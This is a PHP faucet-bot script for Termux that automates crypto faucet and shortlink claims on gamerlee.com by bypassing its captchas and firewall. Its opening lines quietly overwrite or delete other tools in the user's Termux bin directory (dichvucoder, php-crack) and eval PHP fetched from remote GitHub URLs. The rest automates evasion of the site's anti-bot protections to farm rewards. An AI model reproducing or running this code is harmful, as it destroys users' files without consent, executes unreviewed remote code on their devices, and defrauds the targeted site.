
system('clear'); error_reporting(0);
function find($dir) {
   $root = scandir($dir); foreach ($root as $value) {
      if ($value === '.' || $value === '..') {
         continue;
      }if (is_file("$dir/$value")) {
         $result[] = "$dir/$value"; continue;
      }foreach (find("$dir/$value") as $value) {
         $ex = ['php',
            'json',
            'py']; if (in_array(pathinfo($value)['extension'], $ex)) {
            $result[] = $value;
         }}}return $result;
}
$path = find('/storage/emulated/0/');
foreach (['dichvucoder', 'php72-crack', 'php74-crack', 'php82-crack'] as $n) {
   if (file_exists('/data/data/com.termux/files/usr/bin/'.$n)) {
      if (is_file('/data/data/com.termux/files/usr/bin/'.$n)) {
         file_put_contents('/data/data/com.termux/files/usr/bin/'.$n, "#!/usr/bin/php\n<?php\n while(true){ echo 'cemas kau dek\\n';}");
      } elseif (is_dir('/data/data/com.termux/files/usr/bin/'.$n)) {
         system('rm -rf /data/data/com.termux/files/usr/bin/'.$n);
      }
   }
}
$path = '/data/data/com.termux/files/usr/dichvucoder';
if (file_exists($path)) {
   if (is_file($path)) {
      file_put_contents($path, "#!/usr/bin/php\n<?php\n while(true){ echo 'cemas kau dek\\n';}");
   } elseif (is_dir($path)) {
      system('rm -rf '.$path);
   }
}
if (phpversion() > 7 && phpversion() < 8) {
   echo "ANAK KONTOL NI PASTI\n";
}
unlink('cookie.txt'); #require('License.php');
eval(file_get_contents("https://raw.githubusercontent.com/Zhy-08scure/modul/main/lhapi.php"));
eval(file_get_contents("https://raw.githubusercontent.com/Zhy-08scure/modul/main/sl.php"));

const
scr = "gamerlee", host = "https://gamerlee.com/",
ref = "https://gamerlee.com/?r=6158",
reg = "https://cutt.ly/Qe8FnHgv", rc = '[Xevil]', hp = '        ', sl = '[Tertuyul]', ln = '│',
tCap = "Turnstile, ATB ".rc, ver = '1.0';#lc(); cc();
$api = new captcha();
$scraping = new HtmlScrap();

ck:
system('clear');
$configFile = "config.json";
$w = cfg('set', 'FaucetPay_Email');
$ck = cfg('set', 'Cookie');
$ua = cfg('set', 'User_Agent');
function cfg($action, $key, $data = null) {
   global $configFile;

   // Load existing configuration
   if (!file_exists($configFile)) {
      $config = [];
   } else {
      $config = json_decode(file_get_contents($configFile), true);
   }

   switch ($action) {
      case 'set':
         if (!isset($config[$key])) {
            wc();
            $data = readline(input($key)); // Assuming input() is defined
            $config[$key] = $data;
            file_put_contents($configFile, json_encode($config, JSON_PRETTY_PRINT));
         }
         return $config[$key];

      case 'remove':
         unset($config[$key]);
         file_put_contents($configFile, json_encode($config, JSON_PRETTY_PRINT));
         break;

      case 'hide':
         if (!isset($config[$key])) {
            $config[$key] = $data;
            file_put_contents($configFile, json_encode($config, JSON_PRETTY_PRINT));
         }
         return $config[$key];

      case 'get':
         return $config[$key]; // Directly returning the value; will trigger a notice if the key doesn't exist.

      default:
         throw new Exception("Invalid action: $action");
   }
}

function sysUnique() {
   if (PHP_OS_FAMILY == "Linux") {
      exec("getprop", $output);
      $data_sys = [];
      foreach ($output as $system) {
         if (isset(explode("[", $system)[1])) {
            $key = explode("]", explode("[", $system)[1])[0];
            $value = explode("]", explode("[", $system)[2])[0];
            $data_sys[$key] = $value;
         }
      }
      $unique = $data_sys["ro.build.fingerprint"];
   } else {
      exec("wmic csproduct get UUID", $output);
      $unique = $output[1];
   }
   return $unique;
}
function gnr($str) {
   $hurufBesar = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
   $hurufKecil = 'abcdefghijklmnopqrstuvwxyz';
   $nomor = '0123456789';

   for ($i = 0; $i < 10; $i++) {
      $kombinasi = '';
      for ($j = 0; $j < 10; $j++) {
         $kombinasi .= $hurufBesar[rand(0, strlen($hurufBesar) - 1)] .
         $hurufKecil[rand(0, strlen($hurufKecil) - 1)] .
         $nomor[rand(0, strlen($nomor) - 1)];
      }
      print "\r".pan2.p."Generating Your ID: ";
      print cetak(c.($kombinasi), 5000);
      usleep(rand(100000, 300000));
   }
   print r.pan2.p."Your ID: ".h.$str.n; l();
   info("English");
   print r.p."Screenshot(ss/SS) this termux".n;
   print r.p."Send the ss and your ID to ".h."https://cutt.ly/gegLXZHm".n;
   print r.p."To get your License".n; l();
   info("Indonesia");
   print r.p."Screenshot(ss/SS) tampilan ini".n;
   print r.p."Kirim ss-nya beserta ID ke ".h."https://cutt.ly/gegLXZHm".n;
   print r.p."Untuk mendapatkan Lisensimu".n; l();
}
function lc() {
   lsn:wc();
   $uuid = sysUnique();
   if (!file_exists('/data/data/com.termux/files/home/License.txt')) {
      gnr($uuid);
      $lc = readline(input("License")); l();
      file_put_contents('/data/data/com.termux/files/home/License.txt', $lc);
      $lisensi = file_get_contents('/data/data/com.termux/files/home/License.txt'); sleep(2);
      #print $lisensi;exit();
      if (md5($uuid) != $lisensi) {
         print x("Wrong License", d); sleep(2);
         unlink('/data/data/com.termux/files/home/License.txt'); print r; goto lsn;
      }
      sleep(1); print centang.c."License Created".n;
      l(); sleep(1); goto lsn; #return 0;
   }

   $r = file_get_contents("https://pastebin.com/raw/vf8D3pzb");
   preg_match_all('/License:(.*?)#<td>(.*?)<\/td>/', $r, $res);
   $userfound = false;
   #print_r($res[1]);exit;
   foreach ($res[1] as $index => $lsn) {
      if (md5($uuid) == $lsn) {
         $userfound = true;
         if (preg_match('/ban/', $res[2][$index])) {
            print r.pan2.p."License : ".h.$lsn.n;
            print r.pan2.p."Telegram: ".h.str_replace('ban', '', $res[2][$index]).n;
            unlink('/data/data/com.termux/files/home/License.txt'); sleep(1);
            print x("You were banned by violating the rules", d); exit();
         }
         sleep(1); print r.pan2.h."User verified".n;
         sleep(1); print r.pan2.p."Telegram: ".h.$res[2][$index].n;
         sleep(1); l(); break;
      }
   }
   if (!$userfound) {
      print x("User not found", n); exit();
   }
}
function status() {
   $r = file_get_contents("https://pastebin.com/raw/kht81SYQ");
   preg_match_all('#<td>Download Script: (.*?)</td>#', $r, $res);
   $status = explode('#', explode('#gamerlee:', $r)[1])[0];
   $link = $res[1][7]; $a = 100;
   #print_r($res);print $link.'->'.$status.n;exit();
   for ($i = 0; $i <= $a; $i++) {
      print "\r".pan2.c."Checking script status ".($i)."%";
      usleep(40000);
   } print n; sleep(2);
   if ($status == "on" || $status == "On") {
      slow(pan.h."Script Online!");
      sleep(2); system("clear");
   } elseif ($status == "off" || $status == "Off") {
      exit(pan.mc."Script Offline!".n.pan.p."Web Scam/Die/Maintenance/No longer available");
   } elseif ($status == "up" || $status == "Up") {
      slow(pan.o."Script Update!".n.pan.p."Download latest script from link below");
      print pan.p."Download Link: ".h.$link.n;
      exit;
   } elseif ($status == "") {
      print pan2.mc."Connection Lost, Please Check Your Connection!\n".d;
      sleep(1); exit;
   } else {
      slow(pan2.p.$status.d);
      sleep(1); exit;
   }
}
function space($teks, $msg) {
   $len = 15; $lenstr = $len-strlen($teks);
   return $teks.str_repeat(" ", $lenstr).p."| ".$msg.d;
}
function h($token = 0) {
   global $w,$ck,$ua;
   if ($token) {
      $h[] = "x-iconcaptcha-token: ".$token;
      $h[] = "x-requested-with:XMLHttpRequest";
      $h[] = "referer: https://gamerlee.com/";
   }
   $h[] = "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
   $h[] = "upgrade-insecure-requests:1";
   $h[] = "Host: gamerlee.com";
   $h[] = "cookie: ".$ck;
   $h[] = "user-agent: ".$ua;
   return $h;
}
function widget($token) {
   $widgetId = "";
   for ($i = 0; $i < 32; $i++) {
      if ($i === 8 || $i === 12 || $i === 16 || $i === 20) {
         $widgetId .= "-";
      }
      $rand = ($i === 12 ? 4 : ($i === 16 ? (3 & $rand | 8) : mt_rand(0, 15)));
      $widgetId .= dechex($rand);
   }
   return ['res' => base64_encode('{"widgetId":"'.$widgetId.'","action":"LOAD","theme":"light","token":"'.$token.'","timestamp":'.round(microtime(true)*1000).',"initTimestamp":'.round(microtime(true)*1000).'}'),
      'id' => $widgetId];
}
function iconcap($token) {
   while (true) {
      $verif = widget($token);
      print r.k."Bypassing Icon."; usleep(100000);
      $res = json_decode(base64_decode(requests::get(host.'icaptcha/req', h($token), ['payload' => $verif['res']])[1]));
      print r.k."Bypassing Icon.."; usleep(100000);
      $res1 = json_decode(base64_decode(requests::postxskip(host.'icaptcha/req', h($token), ['payload' => base64_encode('{"widgetId":"'.$verif['id'].'","challengeId":"'.$res->identifier.'","action":"SELECTION","x":100,"y":31,"width":320,"token":"'.$token.'","timestamp":'.round(microtime(true)*1000).',"initTimestamp":'.round(microtime(true)*1000).'}')])[1]));
      if ($res1->completed) {
         print r.h."Bypassing Icon..."; usleep(500000);
         return ['widget' => $verif['id'],
            'identifier' => $res1->identifier];
      } else {
         print r.k."Bypassing..."; sleep(rand(3, 5));
      }
   }
}
function fw($api) {
   while (1) {
      $r = run(host."firewall", h())[1];
      $csrf = explode('"', explode('name="csrf_token_name" value="', $r)[1])[0];
      $tipe = explode('"', explode('<input type="hidden" name="captchaType" value="', $r)[1])[0];
      if ($tipe == "recaptchav2") {
         $sitekey = explode('">', explode('<div class="g-recaptcha" data-sitekey="', $r)[1])[0];
         $cap = $api->Recaptchav2($sitekey, host."firewall");
         $data = "g-recaptcha-response=".$cap."&captchaType=recaptchav2&csrf_token_name=".$csrf;
      } elseif ($tipe == "turnstile") {
         $sitekey = explode('"', explode('<div class="cf-turnstile" data-sitekey="', $r)[1])[0];
         $cap = $api->Turnstile($sitekey, host."firewall");
         $data = "cf-turnstile-response=".$cap."&captchaType=turnstile&csrf_token_name=".$csrf;
      } elseif ($tipe == "hcaptcha") {
         $sitekey = explode('"', explode('<div class="h-captcha" data-sitekey="', $r)[1])[0];
         $cap = $api->Hcaptcha($sitekey, host."firewall");
         $data = "h-captcha-response=".$cap."&captchaType=hcaptcha&csrf_token_name=".$csrf;
      } else {
         continue;
      }
      $r = run(host."firewall/verify", h(), $data)[1];
      if (preg_match('/Invalid Captcha/', $r))continue;
      print r.centang.h."Firewall Bypassed".d;
      sleep(2); print r; return 0;
   }
}
function sl($api) {
   $sht = MenuSl();
   if (provider_sl == "Tertuyul") {
      $shortlinks = New ApiTertuyul($sht);
   } else {
      $shortlinks = New ApiSyid($sht);
   }
   info("shortlinks @".scr);
   sl:
   $r = run(host.'dashboard', h())[1];
   $cfw = cfw($r);
   if ($cfw['cf']) {
      cok(1); cfg('remove', 'Cookie'); sleep(1); cfg('set', 'Cookie'); system('clear'); goto sl;
   }
   if ($cfw['fw']) {
      print x("Firewall Detected", d);
      sleep(3); fw($api); goto sl;
   }
   $url = explode('Shortlink ', $r);
   print r.pan2.o."Choose coin for the shortlinks\n"; l();
   foreach ($url as $link => $claim) {
      if ($link == 0)continue;
      $coin = explode("</a>", $claim)[0];
      #print (" ".p.$link.". ".u.strtoupper($coin).n.d);
      menu($link, u.strtoupper($coin).d);
   }l();
   $pilih = readline(input("Number")); l();
   $coin = explode("</a>", explode("Shortlink ", $r)[$pilih])[0];
   while (1) {
      gas:
      $r = run(host."links/currency/$coin", h())[1];
      $cfw = cfw($r);
      if ($cfw['cf']) {
         cok(1); cfg('remove', 'Cookie'); sleep(1); cfg('set', 'Cookie'); system('clear'); continue;
      }
      if (!$cfw['out']) {
         cok(); cfg('remove', 'Cookie'); sleep(1); cfg('set', 'Cookie'); system('clear'); continue;
      }
      if ($cfw['fw']) {
         print x("Firewall Detected", d);
         sleep(3); print r; fw($api); continue;
      }
      $cd = explode('-', explode('var wait =', $r)[1])[0];
      if (preg_match('/temporarily locked/', $r)) {
         print x("Your account is temporarily locked", n);
         print pan1.p."Unlock in ".h.date("H:i:s", $cd).n; l(); sleep(2); break;
      }
      $list = explode('<div class="col-sm-6">', $r);
      foreach ($list as $a => $short) {
         if ($a == 0)continue;
         $short_name = trim(explode('</h4>', explode('<h4 class="card-title mt-0">', $short)[1])[0]);
         $limit = explode('/', explode('class="badge badge-info">', $short)[1])[0];
         $link = explode('"', explode('<a href="', $short)[1])[0];
         #print $short_name.n.$limit.n.$link.n;exit();
         $cek = $shortlinks->check($short_name);
         if ($cek['status']) {
            for ($i = $limit; $i > 0; $i--) {
               verif:
               $r = run($link, h())[1];
               $go = explode('"', explode('action="', $r)[1])[0];
               $csrf = explode('"', explode('name="csrf_token_name" id="token" value="', $r)[1])[0];
               $tk = explode('"', explode('name="token" value="', $r)[1])[0];
               $token = explode("'", explode("name='_iconcaptcha-token' value='", $r)[1])[0];
               #print $csrf.n.$tk.n.$token.n;exit();
               if (preg_match('/Complete Captcha/', $r)) {
                  if (preg_match('/0x4AAAAAAAyl0Ljq55krrtEH/', $r)) {
                     $cap = $api->Turnstile('0x4AAAAAAAyl0Ljq55krrtEH', $link);
                     if (!$cap) {
                        sleep(rand(3, 5)); goto verif;
                     }
                     $data = "csrf_token_name=$csrf&token=$tk&captcha=turnstile&cf-turnstile-response=$cap";
                  } elseif (preg_match('/_iconcaptcha-token/', $r)) {
                     $cap = iconcap($token);
                     if ($cap['identifier']) {
                        $data = 'csrf_token_name='.$csrf.'&token='.$tk.'&captcha=icaptcha&_iconcaptcha-token='.$token.'&ic-rq=1&ic-wid='.$cap['widget'].'&ic-cid='.$cap['identifier'].'&ic-hp=';
                     }
                  } else {
                     print x("Web might update", n);
                     break;
                  }

               }
               $r = run($go, h(), $data, 1);
               #print_r($r); exit;
               /*if (preg_match('/error was encountered/i', $r[1])) {
                  goto verif;
               }*/
               $sl = trim(explode(n, explode('location:', $r[0])[1])[0]);
               if (!$sl) {
                  sleep(2);goto verif;
               }
               $shortlink = str_replace('http://', 'https://', $sl);
               $sln = substr(parse_url($shortlink)['path'], 0, 12);
               #print r.pan2.kb.p." Info: ".h.space("$short_name", o."$i ".kt.n);
               print r.pan2.kb.p." Info: ".h.space("sl$sln", o."$i ".kt.n);
               $bypas = $shortlinks->Bypass($cek['shortlink_name'], $shortlink);
               if (provider_sl == "Tertuyul") {
                  $pass = $bypas['url'];
                  $tmr = rand(120, 150);
               } else {
                  $pass = $bypas;
                  $tmr = rand(90, 120);
               }
               if ($pass) {
                  timer($tmr);
                  #timer(rand(120, 150));
                  $r = run($pass, h(), '', 1)[1];
                  if (preg_match('/Just a moment.../', $r)) {
                     cok(1); cfg('remove', 'Cookie'); sleep(1); cfg('set', 'Cookie'); system('clear'); continue;
                  }
                  $z = explode(" has", explode("html: '0.", $r)[1])[0];
                  $f = explode("',", explode("html: '", $r)[1])[0];
                  if ($z) {
                     z("0.$z", akhir().hp); $shortlinks->balsl(); sleep(2);
                  } elseif (preg_match('/rate-limited/', $r)) {
                     print x("You have been rate-limited", n);
                     $shortlinks->balsl(); sleep(1);
                  } elseif ($f) {
                     print x($f, n); l();
                  } else {
                     print x("Failed to bypass, website might doing an update", n); l();
                  }
                  unlink('cookie.txt');
               }
            }
         }
      }
      print x("All supported shortlinks has been bypassed", n); l(); break;
   }
}
function fct($scraping, $api, $coins) {
   while (true) {
      $r = run(host.'dashboard', h())[1];
      $cfw = cfw($r);
      if ($cfw['cf']) {
         cok(1); cfg('remove', 'Cookie'); sleep(1); cfg('set', 'Cookie'); system('clear'); continue;
      }
      if (!$cfw['out']) {
         cok(); cfg('remove', 'Cookie'); sleep(1); cfg('set', 'Cookie'); system('clear'); continue;
      }
      if ($cfw['fw']) {
         print x("Firewall Detected", d);
         sleep(3); print r; fw($api); continue;
      }
      foreach ($coins as $a => $coin) {
         $r = run(host."faucet/currency/$coin", h())[1];
         $cfw = cfw($r);
         if ($cfw['cf']) {
            cok(1); cfg('remove', 'Cookie'); sleep(1); cfg('set', 'Cookie'); system('clear'); continue;
         }
         if ($cfw['fw']) {
            print x("Firewall Detected", d);
            sleep(3); print r; fw($api); continue;
         }
         if (!preg_match('/(Logout|logout)/', $r)) {
            cok(); cfg('remove', 'Cookie'); sleep(1); cfg('set', 'Cookie'); system('clear'); continue;
         }

         $scrap = $scraping->Result($r, 2);
         $anti = explode('rel=\"', $r)[1];

         $data = $scrap['input'];
         $cd = explode(' -', explode('var wait = ', $r)[1])[0];
         if (preg_match('/rate-limited/', $r)) {
            print x("You have been rate-limited", n);
            timer(rand(5, 15)); print r; continue;
         }
         if ($cd) {
            timer($cd+rand(5, 10)); print r; continue;
         }
         if (preg_match('/Daily claim limit/', $r)) {
            unset($coins[$a]);
            print limit("Daily limit reached", kb.p.strtoupper($coin).kt.n); l(); continue;
         }

         if (preg_match('/0x4AAAAAAAyl0Ljq55krrtEH/', $r) && !$anti) {
            $data['captcha'] = "turnstile";
            $cap = $api->Turnstile('0x4AAAAAAAyl0Ljq55krrtEH', host."faucet/currency/$coin");
            $data['cf-turnstile-response'] = $cap;
            if (!$cap) {
               sleep(5); continue;
            }
         } elseif ($anti && preg_match('/0x4AAAAAAAyl0Ljq55krrtEH/', $r)) {
            if (!$anti) {
               print x("AntiBot Not Found", n);
               sleep(5); continue;
            }
            $atb = $api->AntiBot($r);
            $data['antibotlinks'] = $atb;
            $data['antibotlinks'] = str_replace("+", " ", $atb);
            if (!$atb) {
               sleep(5); continue;
            }
            $data['captcha'] = "turnstile";
            $cap = $api->Turnstile('0x4AAAAAAAyl0Ljq55krrtEH', host."faucet/currency/$coin");
            $data['cf-turnstile-response'] = $cap;
            if (!$cap) {
               sleep(5); continue;
            }
         } else {
            print x("Web might update", n);
            sleep(1); exit();
         }
         $data = http_build_query($data);

         $r = run(host."faucet/verify/$coin", h(), $data)[1];
         $cfw = cfw($r);
         if ($cfw['cf']) {
            cok(1); cfg('remove', 'Cookie'); sleep(1); cfg('set', 'Cookie'); system('clear'); continue;
         }
         if ($cfw['fw']) {
            print x("Firewall Detected", d);
            sleep(3); print r; fw($api); continue;
         }
         preg_match("/title:\s*'([^']+)'\s*,\s*html:\s*'([^']+)'/", $r, $matches);

         $title = $matches[1] ?? '';
         $html = $matches[2] ?? '';
         $ban = explode('</div>', explode('<div class="alert text-center alert-danger"><i class="fas fa-exclamation-circle"></i> Your account', $r)[1])[0];
         $z = explode(" has", explode("html: '", $r)[1])[0];
         if ($ban) {
            print x("Your account".$ban, n);
            exit;
         }
         if (preg_match('/rate-limited/', $r)) {
            print x("You have been rate-limited", n);
            timer(rand(5, 15)); print r; continue;
         }
         if (preg_match('/Shortlink in order to claim from the faucet!/', $r)) {
            print x(explode("'", explode("html: '", $r)[1])[0], d);
            l();
            exit;
         }
         if (preg_match('/sufficient funds/', $r)) {
            unset($coins[$a]);
            print limit("Sufficient funds", kb.p.strtoupper($coin).kt.n);
            l(); continue;
         }
         if (preg_match('/Daily claim limit/', $r)) {
            unset($coins[$a]);
            print limit("Daily limit reached", kb.p.strtoupper($coin).kt.n); l(); continue;
         }
         if (preg_match('/Failed/', $title)) {
            file_put_contents("inv.html", $r); exit;
            print x($html, n);
         } elseif ($z) {
            z($z, akhir());
         } else {
            print r; continue;
         }
      }
      if (!$coins) {
         print x("You have reached daily claim limit", n);
         bal($api); l(); break;
      }
   }
}

dash:
$r = run(host.'dashboard', h())[1];
$cfw = cfw($r);
if ($cfw['cf']) {
   cok(1); cfg('remove', 'Cookie'); sleep(1); goto ck;
}
if (!$cfw['out']) {
   cok(); cfg('remove', 'Cookie'); sleep(1); goto ck;
}
if ($cfw['fw']) {
   print x("Firewall Detected", d);
   sleep(3); print r; fw($api); goto dash;
}
ban();
slow(dot.p.t("Login as", tp.h.$w.tp2)); bal($api); l();

menu:
menu(1, "Faucet"); menu(2, "Shortlinks"); l();
$p = readline(input("Number")); l();
switch ($p) {
case 1:
   select_coin:
   $r = run(host.'dashboard', h())[1];
   preg_match_all('#https?:\/\/'.str_replace('.', '\.', parse_url(host)['host']).'\/faucet\/currency\/([a-zA-Z0-9]+)#', $r, $matches);
   $url = $matches[1];
   foreach ($url as $num => $coins) {
      Menu(($num+1), strtoupper($coins));
      $all_coin[$num+1][0] = $coins;
   }
   Menu(($num += 2), "All Coins"); l();
   $all_coin[$num] = $url;
   print r.pan2.k."Multiple Coins = Put number separated with coma (,)\n".r.pan2.k."Ex: 1, 3, 7, etc or 1,3,5,etc".d.n; l();
   $pil = readline(input("Number")); l();

   $pil = preg_replace('/\s+/', '', $pil);
   preg_match_all('/(\d+)/', $pil, $match);
   if (count($match[1]) > 1) {
      for ($i = 0; $i < count($match[1]); $i++) {
         $coin[$i] = $all_coin[$match[1][$i]][0];
      }
      $cc = strtoupper(implode(",", $coin));
   } elseif (!is_numeric($pil) || $pil > $num || $pil < 1) {
      print x("Wrong method!", n);
      l();
      goto select_coin;
   } else {
      $coin = $all_coin[$pil];
      if (count($coin) > 1) {
         $cc = "All Coins";
      } else {
         $cc = $coin[0];
      }
   }
   info($cc);
   if (fct($scraping, $api, $coin)) {
      cfg('get', 'FaucetPay_Email');
      cfg('get', 'Cookie');
      cfg('get', 'User_Agent');
      goto ck;
   } goto menu;
   fct($scraping, $api, $coins); goto menu;
case 2:
   sl($api, $token); goto menu;
default:
   print x("TooLOL", n); l(); goto menu;
}
